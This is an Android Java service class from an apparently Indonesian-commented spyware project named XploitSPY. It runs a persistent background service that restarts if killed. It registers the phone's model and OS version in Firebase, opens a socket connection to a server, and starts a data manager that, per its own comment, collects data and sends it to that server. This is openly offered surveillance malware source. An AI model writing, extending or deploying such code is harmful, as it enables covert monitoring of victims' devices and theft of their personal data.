package com.xploitspy.client.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import com.xploitspy.client.Config;
import com.xploitspy.client.MainActivity;
import com.xploitspy.client.R;
import com.xploitspy.client.manager.DataManager;
import com.xploitspy.client.manager.FirebaseManager;
import com.xploitspy.client.manager.SocketManager;

/**
 * SpyService - Service utama yang berjalan di background
 * Service ini akan mengumpulkan data dan mengirim ke server
 */
public class SpyService extends Service {
    
    private static final String CHANNEL_ID = "XploitSPY_Channel";
    private static final int NOTIFICATION_ID = 1;
    
    private SocketManager socketManager;
    private DataManager dataManager;
    private FirebaseManager firebaseManager;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        // Initialize managers
        socketManager = new SocketManager(this);
        firebaseManager = new FirebaseManager(this);
        dataManager = new DataManager(this, socketManager, firebaseManager);
        
        // Register device in Firebase
        String productName = android.os.Build.PRODUCT != null ? android.os.Build.PRODUCT : "Unknown";
        firebaseManager.registerDevice(
            android.os.Build.MODEL,
            productName,
            android.os.Build.VERSION.RELEASE
        );
        
        // Connect to server (fallback if same network)
        socketManager.connect();
        
        // Start data collection
        dataManager.start();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Restart service jika di-kill
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        
        if (dataManager != null) {
            dataManager.stop();
        }
        
        if (socketManager != null) {
            socketManager.disconnect();
        }
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "XploitSPY Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Background service untuk XploitSPY");
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent, 
            PendingIntent.FLAG_IMMUTABLE
        );
        
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("XploitSPY")
            .setContentText("Service berjalan di background")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build();
    }
}

